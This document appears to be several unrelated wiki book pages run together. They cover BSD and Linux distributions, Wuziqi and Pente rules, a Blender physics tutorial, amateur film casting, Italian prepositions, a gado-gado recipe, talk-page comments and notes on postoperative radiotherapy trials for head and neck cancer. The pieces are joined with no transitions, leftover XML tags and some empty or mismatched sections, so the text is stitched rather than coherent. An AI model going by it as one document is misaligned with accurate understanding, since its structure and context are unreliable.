== OpenBSD ==
[http://www.openbsd.org/ OpenBSD] was forked off NetBSD when [[w:Theo de Raadt|Theo de Raadt]] had a disagreement with the NetBSD Core Team. Theo founded OpenBSD in the early 1990s. Due to living in Canada Theo was able to legally incorporate strong [[cryptography]] into OpenBSD without encumberance by US laws.

OpenBSD is widely thought of as &quot;the most secure OS&quot;. Its motto is &quot;Secure by Default&quot;. OpenBSD developers review all of the code by hand in order to search for security holes. The default installation of OpenBSD leaves a lot of features turned off, contributing to its motto. OpenBSD runs well on many different platforms due to its NetBSD lineage. OpenBSD is also the origin of [http://www.openssh.org OpenSSH], which is the most popular implementation of ssh, which replaces insecure network logins with the secure ssh protocol.

The OpenBSD project has been replacing many of the GNU programs in their system with programs having BSD-licenses, non-copyleft versions, but they still use GNU gcc and binutils to build. They also use CVS, a source-revision control system under the GNU GPL license, but plan to replace it with their own [http://www.opencvs.org/ OpenCVS] when ready. OpenBSD also includes some large packages like perl, Apache 1.x, sendmail, and bind in the base system instead of putting those things into their ports collection. Thus the base OpenBSD system (with no added packages) has more components than the other BSDs.

=== MirOS BSD ===
[http://mirbsd.mirsolutions.de/ MirOS BSD] was a set of patches, and now is a fork, of OpenBSD. The project is based in Europe. They have resurrected some features that OpenBSD dropped, and moved some packages from the base system to MirPorts, the ports collection. There is a plan to port MirOS to Linux kernel.

== Quasijarus ==
[http://ifctfvax.harhan.org/Quasijarus/ Quasijarus] is different from the other BSDs. It is a fork of 4.3BSD-Tahoe (without the later 4.4BSD changes that the other *BSD projects have). Like 4.3BSD, it only runs on [[w:VAX|VAX]]. Essentially, it is a slightly modified 4.3BSD-Tahoe system.

Linux,&lt;sup&gt;&amp;reg;&lt;/sup&gt; sometimes called GNU/Linux, is a free and open source operating system developed by a loosely knit collection of developers around the world.  The Linux kernel was first created in 1991 by Linus Torvalds, a Finnish college student. The Linux kernel was built on top of the GNU tools which gave the GNU/Linux OS commonly called Linux. It was designed to imitate the behavior and inner workings of UNIX&amp;reg; while remaining free to all to use.

Linux appears in many commercial operating systems like Red Hat and Novell's SUSE, and also in many non-commercial varieties, like Debian, Gentoo, Knoppix and others.  In all, there are hundreds of &quot;distributions&quot;, or Linux based operating systems, available for download on the internet, free of charge.  Some are discussed in more detail below. If you find a distribution that's not listed below, check if it's based on one that is. These derivatives generally have one or more areas they are intended to be different, but otherwise they will be similar. An extensive timeline graphic for currently functioning distributions and also for those which are no longer active can be found here: [http://futurist.se/gldt/ futurist.se/gldt].

== Linux&lt;sup&gt;&amp;reg;&lt;/sup&gt; ==
[[Image:Tux.svg|100px|right]] Linux is the leading UNIX clone. The system generally consists of the [http://www.kernel.org Linux Kernel], [http://www.gnome.org User interface], [http://gcc.gnu.org development tools], [http://www.libreoffice.org Office Software] and other utilities.

Linux consists of [http://www.opensource.org/docs/definition.php Open Source] software. This means users have the right to receive the source code of the operating system. They are also free to study, modify and redistribute the source code. The [http://www.gnu.org/copyleft/gpl.html GNU Public License] is used for about 2/3 of a typical Linux system.

Linux is a result of sustained effort of a huge community of programmers all over the world. Many of them are volunteers working on various projects in their free time. A number of companies also pay developers to work on the software. Linux is available in a variety of different distributions (flavors) including [http://www.ubuntu.com Ubuntu], [http://www.redhat.com Redhat], [http://www.slackware.com/ Slackware], [http://www.gentoo.org/ Gentoo], [http://www.novell.com/products/linuxprofessional SUSE], [http://www.mandrivalinux.com/en Mandriva] and [http://www.debian.org Debian].

One of the keys to the success of Linux is its open development model. This allows the users to contribute to improving the Operating System. The code submitted by individual developers undergoes a rigorous peer review process. This allows only high quality code into the OS. This review process weeds out bugs and security holes. The huge community of programmers (about a million) are able to fix bugs very quickly. Because of this, Linux is considered a very secure and high quality OS.

Linux is easily the most versatile operating system in the world. In addition to desktop computers, Linux is used in tiny {{cite web|url=http://www.linuxdevices.com/|title=embedded devices|archiveurl=http://archive.is/mvBm|archivedate=2012-12-09}}, all sorts of network equipment, [http://www.linuxvirtualserver.org large servers] and even in [http://www.forbes.com/home/enterprisetech/2005/03/15/cz_dl_0315linux.html super computers]. In all these environments Linux provides robust performance, powerful networking, and a high degree of reliability. Linux is in general considered more secure than the Windows alternatives. Viruses, worms, trojans etc. are not as prevalent in Linux environments. This is because of a secure design which does not allow any single user/virus to disrupt the whole system. All normal Linux distributions come with solid firewall abilities. Users generally don't have to install anti-virus software.
&lt;ref&gt;
[http://www.techthrob.com/tech/linuxav.php &quot;Do I Need an AntiVirus Program on Linux?&quot;];
[[Wikipedia: Linux malware]]
&lt;/ref&gt;

Traditionally, Linux desktops have not been considered very user friendly. In recent time Linux desktops have significantly improved. [http://www.gnome.org GNOME] and [http://www.kde.org KDE] are two very popular Linux desktops that feature a very user-friendly environment and plenty of useful software. Some distributions come with all the software that a typical user will ever use packaged with the operating system itself, eliminating the need to purchase extra software as one must do for typical proprietary operating systems. Maintaining and managing Linux desktops can also be very simple. 

Linux is free to download in most cases. Product support is available from the commercial Linux vendors and others. Linux often has low TCO (Total Cost of Ownership) because of its increased reliability, low software costs, and low administrative costs. This is particularly true for small businesses that are unable to negotiate low Windows costs, and for the very large businesses that can devote people to taking advantage of Linux.  However, Linux is also the subject of a very complex copyright [[w:SCO-Linux controversies|dispute]].  Service disruptions from viruses and annoyances from spyware are almost unheard of for Linux users.

In recent times Linux has proliferated to [http://www.tuxmobil.org cell phones], [http://www.osdl.org/lab_activities/carrier_grade_linux telecom equipment], [http://www.osdl.org/lab_activities/data_center_linux/index.html/document_view data centers] and [http://linuxbiometrics.com/modules/news biometrics computation]. Linux is expected to become the operating system of choice for consumer electronics and entertainment industries in future.

Linux is a registered trademark of Linus Torvalds.

== Live CDs ==

People who are entirely new to Linux should try a [[Wikipedia:Linux_Distribution|distribution]] on a [[w:LiveCD|LiveCD]] which is a full Linux system with video, networking, and sound that will run entirely from the CD and will not modify their current operating system.  These live CDs often run slowly but they will give the user an indication of whether that distribution will run on his/her machine, and the user is likely to see that Linux is a user friendly environment with high quality applications, multimedia functions, and network access.

This helps new users to test out how Linux looks before installing it into their system. These live CD also make excellent emergency boot disks, if the system using some other operating systems does not boot up correctly.  Many can even install a complete Linux system while running the live CD, making the installation very simple.

=== Knoppix ===
[http://www.knoppix.net/ Knoppix] was one of the first live CDs.  It has better hardware detection than most distributions, and many Linux users keep a Knoppix disk since it makes a nice rescue and demo system. Knoppix also allows you to test-drive several popular desktop environments, including KDE, IceWM, Window Maker, Fluxbox, Lars, TWM and Xfce.
The book [[Knowing Knoppix/Knoppix for the first time]] has more details.

=== Fedora ===
[https://fedoraproject.org/en/get-fedora Fedora] distributes a popular live CD that uses GNOME and another one that uses KDE.

=== Ubuntu ===
The standard &quot;desktop version&quot; of [https://help.ubuntu.com/community/LiveCD Ubuntu] is a LiveCD.
The book [[Using Ubuntu Linux/Live Boot]] has more details.

== Distributions for New Users ==

People who have chosen to use Linux and need a desktop distribution should try an easy-to-use distro.  Each of the following distros help new users by providing a lot of hand-holding.  In fact, the default installation will install and configure software such that any new user can immediately become productive.


=== Fedora ===
[http://fedora.redhat.com/ Fedora] is a fast paced development that is updated every six months with new version, although the previous version is kept updated for the following 18 months.  The Fedora system is tightly connected with RPM packages, and many open-source programs come ready made for Fedora (such as Mplayer, Gnutella etc...) Fedora is a completely free Linux distribution, meant to be developed with the most cutting edge versions of programs, that are updated with either Yum or Red Hat Networks. Users can choose between the GNOME desktop and the KDE desktop at login time.

=== Mandriva Linux ===
[http://www.mandriva.com Mandriva] Mandriva Linux was the first distro to focus on ease of use.

=== Puppy Linux ===
[http://www.puppylinux.org Puppy Linux] is for beginners and runs fast on old hardware. It also takes up little space on the CD, DVD, or USB flash drive. It makes it easy to modify and add to the basic distribution. When one is combined into a disk image it is called a puplet. Users can upload their puplets to the project's website.

Puppy is a single-user system. That is, the user always has root privileges. This is the same poor security model that gets Windows 9x users in so much trouble.

A slightly more difficult distribution that also has low system requirements is Damn Small Linux. DSL has a better security model than Puppy.

=== Ubuntu Linux ===
[http://www.ubuntu.org Ubuntu] is based on Debian and produces a new release every 6 months rain or shine.  Ubuntu provides free Ubuntu Linux CDs to anyone who asks for them, which makes Ubuntu free-as-in-pizza even if you don't have a high-speed Internet connection.
In the default configuration, you cannot log in as root, or use the &quot;su&quot; command to become the root user.
Instead of the traditional root superuser, Ubuntu uses [[w:sudo|sudo]] to give certain users administrative privileges.
Although one may enable the root account, it is not recommended
[http://ubuntuforums.org/showthread.php?t=31053] [https://help.ubuntu.com/community/RootSudo] [http://opensource.weblogsinc.com/2005/04/11/ubuntu-and-kubuntu-root-and-sudo-help/].

Ubuntu only officially supports a subset of the packages in Debian, but you can access the rest of the packages with a little work.  The default setup includes [[w:GNOME|GNOME]], but there's also a [[w:KDE|KDE]] version of the distribution called [http://www.kubuntu.org Kubuntu].

There are also other versions of Ubuntu available such as [http://www.edubuntu.org Edubuntu] (suited for educational use) and the lightweight versions (in early development) [http://wiki.ubuntu.com/Xubuntu Xubuntu] and [http://www.ubuntulite.org/ UbuntuLite]. Even though the different Ubuntu versions are available as different installations, the only difference between them is what software they have included. So basically they are all the same distribution, and they all have the same software packages available on-line.

=== openSUSE ===

[http://www.opensuse.org openSuSE] is focused on desktop Linux for Business users.  Most of the configuration is done [[w:YaST|YaST]], an open source tool.

=== Moblin ===
{{Wikipedia| Moblin}}
Moblin (&quot;mobile Linux internet&quot;) is a project developing a version of Linux and applications for netbooks and mobile internet devices.

== Distributions for Power Users ==

Regular users of Linux, generally called power users, may prefer distributions like [[w:Debian|Debian]] or [[w:Slackware|Slackware]] to the others due to the easy customization and power these distributions give. Due to this, they also make excellent distributions for servers. New users are encouraged to read the extensive documentation available before trying to use these two distributions unless they have some one who is nearby to help them in case of trouble, or if they have some experience in Linux and want to learn more. Both Debian and Slackware have many derivatives, some of which are also for advanced users. Users considering either one should look into the derivatives as well.

=== Debian GNU/Linux ===
[http://www.debian.org/ Debian] is a non-commercial distribution known for its package management system and strict requirements of its packages and releases.

Debian comes in three branches: stable, testing and unstable. New packages to be included in the distribution are initially pushed to the unstable branch.  Once the package has been shown not to cause too many crashes it is pushed to testing where it will stay for several months while thousands of users test it and work out bugs.  Once most release critical bugs are solved, the package will be a candidate for the stable branch.

An advantage is that the Debian stable branch is very stable indeed and almost bug free but at the price of being a bit outdated. Debian stable often does not include support for the latest hardware and software features desktop users like to see. Therefore, most desktop users of Debian prefer some kind of mix of Stable, Testing and sometimes even Unstable for their final desktop configuration.

Debian also has a very good package management system, quite possibly THE best package management system of any OS in the world.

Debian is also known for being a completely free (as in freedom) operating system, and unless you include the 'non-free' branch in your sources file, everything will be Free Software. The word Free does not pertain to cost (you can sell these things) but to freedom: every package in Debian gives you the right to use, distribute, and modify the software (even for money).

See [[Using Debian]] in a Graphic environment.

=== Slackware ===
Slackware is one of the oldest distributions. Its emphasis is on simplicity of design and following Unix conventions. The result of this focus on design simplicity is that configuration is often left to the user.
(development source: http://en.wikipedia.org/wiki/Slackware)

=== Arch ===
Arch tries to provide a stable and functional minimal core of software and then provide a lot of flexibility for users to customise on top of this. Arch operates a &quot;rolling release&quot; policy, so you can install once and then keep up to date, rather than having to wait for periodical releases and then doing a major upgrade.

== Source-based Distributions ==

Some distributions allow you to build a Linux system starting with just [[w:Source code|source code]].  These distributions are not recommended for new computer users, since it is more complicated and everything has to be compiled.  Installation is slow, but some people find it worth the trouble, as when installation is completed you are left with a powerful, high-performance system. Additionally it is a great learning experience.

=== Gentoo ===

The aim of [http://www.gentoo.org/ Gentoo] is to provide an up-to-date, customizable, and high performance GNU/Linux distribution.

Gentoo is a non-commercial source-based distribution, which means that when installing programs for Gentoo, scripts will download the source code for the program and then compile it to fit your computer configuration (CPU optimizations).  Gentoo uses [[w:Portage (software)|Portage]], a very sophisticated and advanced package manager, to achieve all of this.  The inspiration for Portage came from the BSD Ports packaging system.

Installing a complete system can take quite some time, so it is also possible to install Gentoo with pre-compiled packages, at the cost of some speed optimizations.  Gentoo users claim that the optimizations and configuration options (USE flags) make their computers noticeably faster, but critics of Gentoo argue that the optimizations are overrated and that the increased speed from optimizations are lost when you consider the amount of time the computer has to spend compiling programs.  Also, excessive optimization can lead to instability.

Compared to other distros, Gentoo software tends to be more bleeding edge, which means it is newer and has more features, but is less stable.

=== Linux From Scratch ===
[http://www.linuxfromscratch.org/ Linux From Scratch] is not a distribution at all.  Instead, it is an online book that guides a user through the process of downloading, compiling, installing, and configuring each component of a typical GNU/Linux system.  Although it tends to be impractical for most desktop users, setting up a Linux from Scratch system can be a great learning experience.

=== SourceMage ===
[http://www.sourcemage.org/ SourceMage] is derived from [[w:Sorcerer_(Linux_distribution)|Sorcerer]], probably the first source-based distribution with a good package manager.  It uses Sorcery, a powerful package manager with full dependency resolution and featuring a lot of innovative features, completely written in [[w:Bash|bash]].

Perhaps the main difference between Gentoo and SourceMage is the ease of use and installation, which is faster because of the project's emphasis on speed.&lt;ref&gt;
[http://www.sourcemage.org/FrequentlyAskedQuestions/DiffGentoo &quot;FrequentlyAskedQuestions: DiffGentoo&quot; See Speed under &quot;Other Distinctions&quot;]
&lt;/ref&gt;

It's mainly targeted at Linux From Scratch users bored from the process of maintaining their systems manually, and will look somewhat familiar for Debian users, as its package manager shares some concepts with Apt, but is far more flexible. Also, SourceMage has a Social Contract similar to the Debian Social Contract.

'''Description''': Wuziqi is the Chinese name for the board game known as [[../Gomoku/]] in Japanese, although the board doesn't have to be 15x15 (it could be infinite).

'''Aim''': to get five of one's pieces in a row

'''Rules''': Players alternate turns, players may not make more than one move in one turn, players may skip their move during their turn.

'''Gameplay''': Either Black or White may make the first move (This decision is up to the players).

'''Description''': 

'''Aim''':
*''Black'': to get exactly 5 pieces in a row, without making any forbidden moves
*''White'': to get 5 or more pieces in a row, or to force Black to make a forbidden move &lt;!-- what moves ARE forbidden?!? --&gt;

'''Rules''': players alternate turns, players may not make more than one move in one turn, players may skip their move during their turn.

'''Gameplay''': 

''Opening sequence'':
#The Black player plays the first '''three''' moves. They do this by placing the first black piece, then they (still the black player) place the first white piece, then the second black piece.
#:
#The current White player then is permitted to choose to become the new Black player, if he or she finds the opening situation particularly disadvantageous for White. (Note: This ensures the original Black player does not intentionally play a poor first move for White.)
#:
#The new White player (and the White player for the rest of the game) places the second white piece on the board.
#:
#The new Black player (and the Black player for the rest of the game) places '''two''' black pieces on the board. White is essentially given a choice between two potential black moves. White chooses which of the two moves the Black player may make, and the rejected potential move is removed from the board.
#:
#White plays his or her next move, and the game continues as in the rules above.

'''Description''': Pente is unlike a lot of n in row games in that it also involves capturing pieces

'''Aim''': to get five of ones pieces in a row OR to capture 5 sets of opponent pieces

'''Rules''': During their turn, a player places a stone of their color onto the board.  If the stone is horizontally, vertically or diagonally adjecent to an opponent's stone and is opposite of a corresponding stone, the opponent's stone is captured. 

'''Gameplay''': White moves first (unlike [[../Gomoku/]] and [[../Renju/]]), and players alternate turns.

== Variations of Pente ==

'''Pente+/-'''

When a player captures a set of pieces, they may choose to add this to their set of captured pieces or subtract the capture from their opponent's set of captures.

We will teach you to make a realistic ball rolling down the hill using Blender's game engine. 

First, make a plane. Subdivide it a few times and scale it up a lot. Now, make a sphere. It can be any kind except ''meta''. With the sphere selected, go to the game engine settings. (It is the little purple Pacman-icon.) You will see something that says ''Actor''. Press it. Now press ''Dynamic''. You will see a bunch of settings available now. Change ''Size'' to 1.4. Also enable ''Rigid body''. This will let the ball roll. Edit the plane, pulling vertices up or down. For this example, make it look like a canyon. Put the ball at the start point and press the P-Key. You will see the ball fall in, and roll. If it doesn't go the way you wanted, Pull some vertices of the canyon downwards. Incline your plane to let the ball roll. If you just see white, don't worry. Press escape to exit the game mode. Press Z key. Go back into game mode and it will look like wireframe. the ball will roll through the canyon. Well done! You should give it finishing touches, like effects, color, etc. And that's it.

      <text xml:space="preserve">Since we only had a limited number of people in our 'talent pool', we had to mix and match for the best match of character to actor. While this meant that sometimes the preferred act was not provided, it meant that we would be able to film without constantly reusing actors in main roles.

==General Casting==

The general casting period was more or less finding out who would be willing and interested in joining in such an undertaking. Fortunately, the number of volunteers that were found numbered almost enough to cover all roles that were needed. It was at this period that specific characters were considered for each actor.

==Dividing Potentials==

A side effect of casting in this way meant that most of the cast and crew would know each other. This meant that when shortlisting actors for specific characters, we could typecast into who we thought would be the most successful at portraying a character.

      <text xml:space="preserve">== Prepositions / Preposizioni ==
The &quot;standard&quot; prepositions that are taught at school are
* ''di'' ('of', 'belonging to'; used in place of the English genitive)
* ''a'' ('to')
* ''da'' ('from', 'by')
* ''in'' ('in', 'on' with abstract nouns)
* ''con'' ('with')
* ''su'' ('on')
* ''per'' ('for', 'in order to')
* ''tra'' ('among', 'between')
* ''fra'' ('among', 'between')

Remember that the above translations into English are only approximate.  ''bravo in matematica'' obviously translates into English as ''good at mathematics'' and not ''good in mathematics''.

When prepositions are used together with definite articles, the preposition and the article are sometimes condensed into a single word.  For example, &quot;of the student&quot; becomes &quot;dello studente&quot; and '''not''' &quot;di lo studente&quot;.

More specifically, the following table lists all the possible combinations (except those not in common use today).
{| border=&quot;1&quot;
! !! il !! lo !! la !! i !! gli !! le
|-
! di
| del || dello || della || dei || degli || delle
|-
! a
| al || allo || alla || ai || agli || alle
|-
! da
| dal || dallo || dalla || dai || dagli || dalle
|-
! in
| nel || nello || nella || nei || negli || nelle
|-
! su
| sul || sullo || sulla || sui || sugli || sulle
|-
|}

Please note that using these combinations is '''mandatory''': you cannot choose to use plain preposition + article instead. ''Con'', ''per'', ''tra/fra'' and all other prepositions don't have contracted forms, they simply use preposition + article. Originally ''con'' and ''per'' also had contracted forms (''col, collo, etc.'' and ''pel, pella, etc.'') but these are never used anymore (with the exception ''col'' (= con + il) which is still occasionally found). 

The prepositions ''di'' and ''da'' '''may''' take an apostrophe and become '' d' '' before a vowel.  Examples where this is the rule, and not simply a matter of personal preference, are
* ''d'altra parte'', lit. &quot;from other side&quot;, meaning &quot;on the other hand&quot;
* ''d'altro canto'', lit. &quot;from other place&quot;, as above
* ''d'altri'', &quot;of others&quot; (but ''di altri'' is acceptable)
* ''d'oro'', &quot;made of gold&quot;, &quot;golden&quot;
* ''d'argento'', &quot;made of silver&quot;
* ''d'oltreoceano'', ''d'oltralpe'', etc.

For euphonic reasons, the proposition ''a'' usually becomes ''ad'' before a vowel, though this is not mandatory. When the vowel following the preposition is another 'a', using ''ad'' can probably be considered mandatory. Examples: ''ad altri'' (to others), ''ad essere'' or ''a essere'' (to be), ''ad oltranza'' or ''a oltranza'' (ad libitum).

Historically, ''per'' has been a combinable preposition (with combined forms ''pel'', ''pello'', ''pella'', ''pei'', ''pegli'',  ''pelle''), but this usage is never encountered in contemporary prose, even though it is still present in the dialects of Tuscany.

'''Gado-gado''' is a [[Cookbook:Vegetable|vegetable]] [[Cookbook:Salad|salad]] with a [[Cookbook:Peanut Sauce|peanut sauce]] dressing.

== Ingredients ==

* For the salad:
** mixed vegetables ([[Cookbook:Cabbage|cabbage]], [[Cookbook:Bean Sprout|bean sprouts]], [[Cookbook:Cucumber|cucumber]], [[Cookbook:Chayote|chayote]], water spinach, yardlong bean, [[Cookbook:Spinach|spinach]]). [[Cookbook:Cauliflower|Cauliflower]], [[Cookbook:Green Bean|green beans]], [[Cookbook:Watercress|watercress]], [[Cookbook:Carrot|carrots]], [[Cookbook:Tomato|tomato]]es, or [[Cookbook:Pea|peas]] are sometimes included but less common.
** [[Cookbook:Potato|potato]]es
** [[Cookbook:Deep frying|deep fried]] [[Cookbook:Tofu|soybean cake]]
** deep fried [[Cookbook:Tempeh|tempeh]]
** boiled [[Cookbook:Egg|egg]]s
** deep fried kerupuk (fish or prawn crackers)
** deep fried [[Cookbook:Shallot|shallot]]

* For the [[Cookbook:Peanut Sauce|peanut sauce]] (4 servings):
** 300 gr [[Cookbook:Peanut|peanuts]]
** 1 clove [[Cookbook:Garlic|garlic]]
** 4 [[Cookbook:Shallot|shallot]]
** 1 gr [[Cookbook:Terasi|terasi]] (fermented prawn paste)
** 125 gr [[Cookbook:Gula Jawa|Gula Jawa]] (Indonesian Palm Sugar)
** [[Cookbook:Sugar|sugar]]
** fresh or dried [[Cookbook:Chili Pepper|chili pepper]]
** fresh [[Cookbook:Lime|lime]] juice, or [[Cookbook:Rice vinegar|rice vinegar]]

== Procedure ==
For the [[Cookbook:Peanut_Sauce|peanut sauce]]
#[[Cookbook:Frying|Fry]] prawn paste with cooking oil until fragrant
#Fry the peanuts until golden brown, remove from the pan and leave to cool, and drain off all but a little of the excess oil
#Grind the peanuts to make paste
# Add [[Cookbook:Grinding|ground]] fresh chili pepper, garlic, salt, brown sugar and prawn paste to the peanut paste, grind to mix
# Put peanut paste in a pan, add some water to dissolve (use [[Cookbook:Coconut Milk|coconut milk]] for richer taste) 
# Add some sugar into the peanut sauce to taste and bring to the boil
# [[Cookbook:Simmering|Simmer]] peanut sauce until thick and season with the lemon or lime juice.

For the salad
# [[Cookbook:Boiling|Hard-boil]] the eggs and [[Cookbook:Slicing|slice]] 
# [[Cookbook:Steaming|Steam]] or boil the potatoes then remove the skin
# Deep fry the boiled potatoes until golden brown, then slice
# Wash, shred or [[Cookbook:Chop|chop]] cabbage, spinach and water spinach
# Boil water in a pan, put cabbage in boiling water until cooked, strain
# Use strained boiling water, boil spinach and water spinach, one after another, strain
# [[Cookbook:Blanching|Blanche]] bean sprout for about 30 seconds, strain
# Peel chayote, wash, slice, and boil until tender
# Wash then slice cucumber
# Place the salad, sliced potatoes, fried tofu, fried tempeh, and eggs in a large plate, either randomly or in layers
# Pour the peanut sauce over the salad
# Spread deep fried shallots on top and serve with kerupuk.

== Notes, tips, and variations ==
* Prawn crackers are non-vegetarian. You can substitute them with ''kerupuk sayur'' or ''emping'' if you wish this dish to be completely vegetarian.
* Put some ''kecap manis'' (Malay/Indonesian sweet [[Cookbook:Soy sauce|soy sauce]]) to taste.
* You may substitute the peanut sauce recipe for the procedure here.
* [[Cookbook:Cashew|cashew nuts]] is secret ingredient to make peanut sauce tastes richer.
* Some cooks like to [[Cookbook:Blanching|blanche]] or [[Cookbook:Steaming|steam]] the cabbage, cauliflower, and carrots rather than serve them raw.
* Use chunky [[Cookbook:Peanut_Butter|peanut butter]] as substitute for ground peanuts.
* Use [[Cookbook:Hot Sauce|chili sauce]] to substitute fresh or dried [[Cookbook:Chili Pepper|chili pepper]].

      <text xml:space="preserve">==Name of this wikibook==
I'm starting to have second thoughts about this wikibook's name...it might be too long/cumbersome, but if we change it we should do so soon before people begin linking.  I wouldn't mind removing the apostrophe from the name as well. [[User:Jxn|jxn]] 05:32, 23 Mar 2005 (UTC)

:It's quite a long title. I suggest Enlightenment. There's currently nothing there. --[[User:Snaxe920|Snaxe920]] 04:26, 13 February 2006 (UTC)

==Content Layout==
I am looking for input and ideas on the layout for this wikibook.  Should it be multiple pages?  Should there be separate subsections for installation?  Should different OS's each have separate installation instruction pages?  What should the first page include?  Do we need a Table of Contents?  Please give me some ideas. [[User:Jxn|jxn]] 05:20, 23 Mar 2005 (UTC)

I have been using e for nearly 4 years - basically as long as I've been using GNU/Linux, and am excited to discover this user's manual.  My feelings are that we certainly should go for multiple pages.  Perhaps the main page should have an introductory section (like it already has), and then a series of headings and links to help people quickly find the sort of information they are looking for.  I think that the main page should not be too long.[[User:Latch.r|Latch.r]] 01:00, 16 February 2007 (UTC)

==Things that need to be added to this wikibook==

The end section (starting at &quot;Decisive Moments&quot;) is not only difficult to comprehend, it suggests bias (i.e., the arbitrary selection of &quot;low points&quot; in American politics).  Should it be removed?

------

&quot;The U.S. Constitution makes no mention of political parties. This was a smart move; it would be anti-Constitutional to show any preference to any political party.&quot;

So...if the '''U.S. Constitution''' made mention of parties..it would be
''anti-constitutional''... what kinda crack are you on?

== Linked in to Bookshelf ==

Ok, I've added this to the Political Science Bookshelf.  Can we remove the notice now?  [[User:Chadlupkes|Chadlupkes]] 02:57, 27 February 2006 (UTC)

:To remove the notice, just edit the page and delete the {{tl|cleanup-link}} tag found at the top of the page, like I have now done. --[[User:Kernigh|Kernigh]] 04:12, 27 February 2006 (UTC)

How about some mention of the real power behind politics in America, big money, and its effects on our system. That would be a good start. Then maybe touch on how the two party system is monopolistic and other ways in which real democracy is stifled in this country. This article reads like the bullshit propaganda I was fed in elementary school.

::I have added some more material to the page, especially drawing out the item on the '48 election. I concur these pages must be written as neutral as possible. In terms of sources, I refer you to the Truman autobiography, especially volume 1. I would hesitate to refer to &quot;parliament&quot; without making a section that compares the US Senate and House with the UK House of Lords and Commons. Some comment asbout &quot;checks and balances&quot; may also be useful. Perhaps even a digression to why people feel the need to identify with any party at all. Also no discussion of &quot;party less&quot; people, the so called independent voters who are largely responsible for shifts in the political spectrum rather than third parties. Finally, is the &quot;Taxed Enough Already Party&quot; really the Federalist Party by any other name.[[User:Kerojack|Kerojack]] ([[User talk:Kerojack|discuss]] • [[Special:Contributions/Kerojack|contribs]]) 21:34, 10 December 2011 (UTC)</text>

&lt;big&gt;'''Postoperative RT'''&lt;/big&gt;


==Surgical Technique==
*No universally accepted definition of &quot;resectable&quot; vs &quot;unresectable&quot; tumor
*Lymph node dissection classification (PMID 12117328)
**&lt;u&gt;Radical neck dissection&lt;/u&gt;: all ipsilateral cervical LN groups from inferior border of mandible superiorly to clavicle inferiorly and from lateral border of sternohyoid muscle/hyoid bone/contralateral anterior belly of digastric muscle anteriorly to anterior border of trapezius posteriorly. All lymph nodes from Level I - V. Spinal accessory nerve, internal jugular vein, and sternocleidomastoid muscles are removed. No removal of suboccipital, periparotid, buccal, retropharyngeal, and paratracheal lymph nodes
**&lt;u&gt;Modified radical neck dissection&lt;/u&gt;: excision of all lymph nodes routinely removed by radical neck dissection with preservation of one or more nonlymphatic structures, ie, spinal accessory nerve, internal jugular vein, and/or sternocleidomastoid muscle.
**&lt;u&gt;Selective neck dissection&lt;/u&gt; (SND): cervical lymphadenectomy with preservation of 1 or more of the lymph node groups that are routinely removed in the radical neck dissection. The lymph node groups removed are based on the patterns of metastases, which are predictable relative to the primary site of disease
***Supraomohyoid neck dissection: SND I-III. Oral cavity cancers. In case of oral tongue, some recommend SND I-IV. For cancers involving midline, bilateral SND I-III
***Lateral neck dissection: SND II-IV. Oropharyngeal, hypopharyngeal, and laryngeal cancers. If retropharyngeal LNs, they can be dissected as well
***Posterolateral neck dissection: SND II-V. Cutaneous melanoma
***Anterior neck dissection: SND VI. Thyroid, larynx, hypopharynx
**&lt;u&gt;Extended neck dissection&lt;/u&gt;: removal of 1 or more additional lymph node groups or nonlymphatic structures, or both, not encompassed by the radical neck dissection. Examples of lymph node groups include the parapharyngeal (retropharyngeal), superior mediastinal, perifacial (buccinator), and paratracheal lymph nodes. Examples of nonlymphatic structures include the carotid artery, hypoglossal nerve, vagus nerve, and paraspinal muscles.


===Selective neck dissection===
*'''Goettingen, Germany, 2001''' (1986-1997) PMID 11226954 -- &quot;Efficacy of selective neck dissection: a review of 503 cases of elective and therapeutic treatment of the neck in squamous cell carcinoma of the upper aerodigestive tract.&quot; (Ambrosch P, Otolaryngol Head Neck Surg. 2001 Feb;124(2):180-7.)
**Retrospective. 503 patients, selective neck dissection. pN0 49% vs pN+ 51%. Postop RT pN0 14% vs. pN+ 62%. Median F/U 3.4 years
**Outcome: 3-year RR pN0 5% vs. pN1 5% vs. pN2 12%. RT marginal benefit for pN1 and significant benefit for pN2 or ECE
**Conclusion: Results achieved with selective neck dissection compare favorably with reported modified radical neck dissection

===Criopharyngeal myotomy===
*'''RTOG 85-30''' (1989-1994)
**Randomized. 125 patients. Arm 1) standard surgery vs. Arm 2) surgery + cricopharyngeal myotomy
**'''1999''' PMID 10488976 -- &quot;Failure of cricopharyngeal myotomy to improve dysphagia following head and neck cancer surgery.&quot; (Jacobs JR, Arch Otolaryngol Head Neck Surg. 1999 Sep;125(9):942-6.)
***Outcome: No difference in oropharyngeal swallowing efficiency at 6 months
***Conclusion: No benefit for cricopharyngeal myotomy

==Surgery + Post-op RT vs Primary RT==
*'''RTOG; 1993''' (1985-1990) PMID 8262821 &amp;mdash; &quot;Is a surgical resection leaving positive margins of benefit to the patient with locally advanced squamous cell carcinoma of the head and neck: a comparative study using the intergroup study 0034 and the Radiation Therapy Oncology Group head and neck database.&quot; Laramore GE et al. Int J Radiat Oncol Biol Phys. 1993 Dec 1;27(5):1011-6. 
**Compared pts treated on a prospective Intergroup study (surgical group) with pts from a historical database who received RT alone, matched for similar characteristics. 109 pts in the surgical group had positive margins and most received post-op RT.
**4-yr LRC 44% (positive margins) vs 24% (RT). No difference in MS or 4-yr OS. 
**Conclusion: incomplete surgery (+adjuvant RT) affords improved local control compared to RT alone

==Surgery + RT vs. Primary Chemo-RT==
*'''Singapore''' (1996-2000)
**Randomized. ''Stopped early due to slow accrual.'' 199 patients, resectable Stage III/IV SCHNC excluding NPC and salivary glands (larynx 32% (supraglottis 23%), oral cavity 27%, oropharynx 21%, hypopharynx 12%). T4 56%. Arm 1) surgery + adjuvant RT 60/30 vs. Arm 2) RT 66/33 + concurrent cisplatin 20 mg/m2 + 5-FU 1000 mg/m2 x2 cycles. 90% received at least 1 cycle of chemo

***Outcome: 3-year DFS: S+RT 50% vs. chemo-RT 40% (NS). Organ preservation (larynx/hypopharynx 68%, oropharynx 55%, oral cavity 21%, paranasal sinus 0%). Chemo-RT group had poor surgical salvage of 47%, with no long-term survivors
***Conclusion: Chemo-RT not superior to surgery+RT, but can be attempted for organ preservation in larynx, hypopharynx, and oropharynx


==Pre-op RT vs Post-op RT==
*Historically, pre-op RT was favored since it facilitated regression of tumor, and improved LRC over surgery alone
*However, morbidity of this approach lead to greater emphasis on post-op RT in 1960's and 1970's (see Fletcher PMID 13403033 (1957), PMID 4190460(1970))
*Randomized trial RTOG 73-03 demonstrated significantly better LRC for post-op RT
